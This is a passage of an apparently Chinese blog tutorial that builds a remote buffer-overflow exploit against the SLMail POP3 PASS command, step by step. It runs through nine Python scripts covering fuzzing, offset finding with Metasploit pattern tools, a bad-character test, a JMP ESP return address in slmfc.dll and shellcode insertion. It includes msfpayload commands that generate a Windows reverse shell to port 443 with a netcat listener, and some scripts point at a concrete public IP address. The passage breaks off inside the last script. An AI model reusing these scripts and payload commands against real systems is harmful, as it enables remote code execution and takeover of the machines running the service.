class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nSending evil buffer...."</span></span><br><span class="line">s.connect((<span class="string">'1.1.1.1'</span>,<span class="number">110</span>))</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> data</span><br><span class="line"></span><br><span class="line">s.send(<span class="string">'USER user'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> data</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><p>测试PASS命令接收到大量数据时是否会溢出<br>EIP寄存器存放下一条指令的地址</p><blockquote><h4 id="python代码02-py"><a href="#python代码02-py" class="headerlink" title="python代码02.py"></a>python代码<code>02.py</code></h4></blockquote><p>以每200递增循环发送A,测试溢出点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">buffer=[<span class="string">"A"</span>]</span><br><span class="line">counter=<span class="number">100</span></span><br><span class="line"><span class="keyword">while</span> len(buffer)&lt;=<span class="number">30</span>:</span><br><span class="line">buffer.append(<span class="string">"A"</span>=*counter)</span><br><span class="line">counter=counter+<span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> string <span class="keyword">in</span> buffer:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Fuzzing PASS with %s bytes"</span> % len(string)</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((<span class="string">'1.1.1.1'</span>,<span class="number">110</span>))</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+string+<span class="string">'\r\n'</span>)</span><br><span class="line">s.send(<span class="string">'QUIT\r\n'</span>)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><blockquote><h4 id="2700个字符实现EIP寄存器溢出03-py"><a href="#2700个字符实现EIP寄存器溢出03-py" class="headerlink" title="2700个字符实现EIP寄存器溢出03.py"></a>2700个字符实现EIP寄存器溢出<code>03.py</code></h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=<span class="string">'A'</span>*<span class="number">2700</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\nSending evil buffer..."</span></span><br><span class="line">s.connect((<span class="string">'1.1.1.1'</span>,<span class="number">110</span>))</span><br><span class="line">date=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+buffer+<span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><p>找到精确溢出的4个字符<br>    二分法<br>    唯一字串法<br>        <code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700</code></p><blockquote><h4 id="python代码04-py"><a href="#python代码04-py" class="headerlink" title="python代码04.py"></a>python代码<code>04.py</code></h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=</span><br><span class="line"><span class="string">'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9'</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\nSending evil buffer..."</span></span><br><span class="line">s.connect((<span class="string">'1.1.1.1'</span>,<span class="number">110</span>))</span><br><span class="line">date=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+buffer+<span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><p><code>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb 39694438</code>    #计算EIP寄存器内存地址ASCII码在2700唯一字符串中的偏移量</p><blockquote><h4 id="python代码05-py"><a href="#python代码05-py" class="headerlink" title="python代码05.py"></a>python代码<code>05.py</code></h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=<span class="string">"A"</span>*<span class="number">2606</span>+<span class="string">"B"</span>*<span class="number">4</span>+<span class="string">"C"</span>*<span class="number">20</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\nSending evil buffer..."</span></span><br><span class="line">s.connect((<span class="string">'1.1.1.1'</span>,<span class="number">110</span>))</span><br><span class="line">date=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+buffer+<span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><p>思路:<br>将EIP修改为shellcode代码的内存地址,将shellcode写入到该地址空间,程序读取EIP寄存器数值,将跳转到shellcode代码段并执行；<br>寻找可存放shellcode的内存空间</p><blockquote><h4 id="python代码06-py"><a href="#python代码06-py" class="headerlink" title="python代码06.py"></a>python代码<code>06.py</code></h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=<span class="string">"A"</span>*<span class="number">2606</span>+<span class="string">"B"</span>*<span class="number">4</span>+<span class="string">"C"</span>*(<span class="number">3500</span><span class="number">-2606</span><span class="number">-4</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\nSending evil buffer..."</span></span><br><span class="line">s.connect((<span class="string">'1.1.1.1'</span>,<span class="number">110</span>))</span><br><span class="line">date=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+buffer+<span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><p>不同类型的程序,协议,漏洞,会将某些字符认为是坏字符,这些字符有固定用途<br>    返回地址,Shellcode,buffer中都不能出现坏字符<br>    null byte (0x00) 空字符,用于终止字符串的拷贝操作<br>    return (0x0D)回车操作,表示POP3 PASS命令输入完成<br>    思路:发送0x00—-0xff 256个字符,查找所有坏字符<br>    00000000 11111111 256 #二进制</p><blockquote><h4 id="python代码07-py"><a href="#python代码07-py" class="headerlink" title="python代码07.py"></a>python代码<code>07.py</code></h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">badchars=(</span><br><span class="line"><span class="string">"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F\x10"</span></span><br><span class="line"><span class="string">"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F\x20"</span></span><br><span class="line"><span class="string">"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2A\x2B\x2C\x2D\x2E\x2F\x30"</span></span><br><span class="line"><span class="string">"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3A\x3B\x3C\x3D\x3E\x3F\x40"</span></span><br><span class="line"><span class="string">"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50"</span></span><br><span class="line"><span class="string">"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x5B\x5C\x5D\x5E\x5F\x60"</span></span><br><span class="line"><span class="string">"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70"</span></span><br><span class="line"><span class="string">"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x7B\x7C\x7D\x7E\x7F\x80"</span></span><br><span class="line"><span class="string">"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x8B\x8C\x8D\x8E\x8F\x90"</span></span><br><span class="line"><span class="string">"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9A\x9B\x9C\x9D\x9E\x9F\xA0"</span></span><br><span class="line"><span class="string">"\xA1\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xAB\xAC\xAD\xAE\xAF\xB0"</span></span><br><span class="line"><span class="string">"\xB1\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xBB\xBC\xBD\xBE\xBF\xC0"</span></span><br><span class="line"><span class="string">"\xC1\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xCB\xCC\xCD\xCE\xCF\xD0"</span></span><br><span class="line"><span class="string">"\xD1\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xDB\xDC\xDD\xDE\xDF\xE0"</span></span><br><span class="line"><span class="string">"\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xEB\xEC\xED\xEE\xEF\xF0"</span></span><br><span class="line"><span class="string">"\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFB\xFC\xFD\xFE\xFF\x00"</span>)</span><br><span class="line"></span><br><span class="line">buffer=<span class="string">"A"</span>*<span class="number">2606</span>+<span class="string">"B"</span>*<span class="number">4</span>+badchars</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\nSending evil buffer..."</span></span><br><span class="line">s.connect((<span class="string">'107.191.43.139'</span>,<span class="number">110</span>))</span><br><span class="line">date=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+buffer+<span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><pre><code>0x0A    0x0D    0x00    #坏字符</code></pre><p>重定向数据流<br>    用ESP的地址替换EIP的值<br>    但是ESP地址变化,硬编码不可行<br>    SLMaail线程应用程序,操作系统为每个线程分配一段地址范围,每个线程地址范围不确定<br>变通思路<br>    在内存中寻找地址固定的系统模块<br>    在模块中寻找JMP ESP 指令的地址跳转,再由该指令间接跳转到ESP,从而执行shellcode<br>    mona.py脚本识别内存模块,搜索”return address”是JMP ESP指令的模块<br>    寻找无DEP,ALSR保护的内存地址<br>    内存地址不包含坏字符<br>    寻找不受保护的系统模块<br>        !mona modules<br>    将汇编指令jmp esp 转换为二进制<br>        <code>/usr/share/metasploit-framework/tools/exploit/masm_shell.rb</code><br>        FFE4<br>    在模块中搜索FFE4指令<br>    <code>!mona find -s &quot;\xff\xe4&quot; -m slmfc.dll</code><br>        选择不包含坏字符的内存地址<br>    在该地址设置断点<br>    重发buffer</p><blockquote><h4 id="python代码08-py-地址全翻转"><a href="#python代码08-py-地址全翻转" class="headerlink" title="python代码08.py(地址全翻转)"></a>python代码<code>08.py</code>(地址全翻转)</h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=<span class="string">"A"</span>*<span class="number">2606</span>+<span class="string">"\xe3\x41\x4b\x5f"</span>+<span class="string">"C"</span>*<span class="number">390</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\nSending evil buffer..."</span></span><br><span class="line">s.connect((<span class="string">'1.1.1.1'</span>,<span class="number">110</span>))</span><br><span class="line">date=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+buffer+<span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><blockquote><h4 id="生成shellcode"><a href="#生成shellcode" class="headerlink" title="生成shellcode"></a>生成shellcode</h4></blockquote><p><code>Scratch</code>        #写shellcode的工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;msfpayload -l</span><br><span class="line">.&#x2F;msfpayload win32_reverse lhost&#x3D;1.1.1.1 lport&#x3D;443 C</span><br><span class="line">.&#x2F;msfpayload win32_reverse lhost&#x3D;1.1.1.1 lport&#x3D;443 R | .&#x2F;msfencode -b &quot;\x00\x0a\x0d&quot;</span><br><span class="line">nc -vip 443</span><br></pre></td></tr></table></figure><blockquote><h4 id="python代码09-py"><a href="#python代码09-py" class="headerlink" title="python代码09.py"></a>python代码<code>09.py</code></h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">shellcode=(</span><br><span class="line"><span class="string">"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F\x10"</span>+</span><br><span class="line"><span class="string">"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F\x20"</span>+</span><br><span class="line"><span class="string">"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2A\x2B\x2C\x2D\x2E\x2F\x30"</span>+</span><br><span class="line"><span class="string">"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3A\x3B\x3C\x3D\x3E\x3F\x40"</span>+</span><br><span class="line"><span class="string">"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50"</span>+</span><br><span class="line"><span class="string">"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x5B\x5C\x5D\x5E\x5F\x60"</span>+</span><br><span class="line"><span class="string">"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70"</span>+</span><br><span class="line"><span class="string">"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x7B\x7C\x7D\x7E\x7F\x80"</span>+</span><br><span class="line"><span class="string">"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x8B\x8C\x8D\x8E\x8F\x90"</span>+</span><br><span class="line"><span class="string">"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9A\x9B\x9C\x9D\x9E\x9F\xA0"</span>+</span><br><span class="line"><span class="string">"\xA1\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xAB\xAC\xAD\xAE\xAF\xB0"</span>+</span><br><span class="line"><span class="string">"\xB1\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xBB\xBC\xBD\xBE\xBF\xC0"</span>+</span><br><span class="line"><span class="string">"\xC1\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xCB\xCC\xCD\xCE\xCF\xD0"</span>+</span><br><span class="line"><span class="string">"\xD1\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xDB\xDC\xDD\xDE\xDF\xE0"</span>+</span><br><span class="line"><span class="string">"\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xEB\xEC\xED\xEE\xEF\xF0"</span>+</span><br><span class="line"><span class="string">"\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFB\xFC\xFD\xFE\xFF\x00"</span>)</span><br><span class="line"></span><br><span class="line">buffer=<span class="string">"A"</span>*<span class="number">2606</span>+<span class="string">"\xe3\x41\x4b\x5f"</span>+<span class="string">"\x90"</span>*<span class="number">8</span>+shellcode</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\nSending evil buffer..."</span></span><br><span class="line">s.connect((<span class="string">'107.191.43.139'</span>,<span 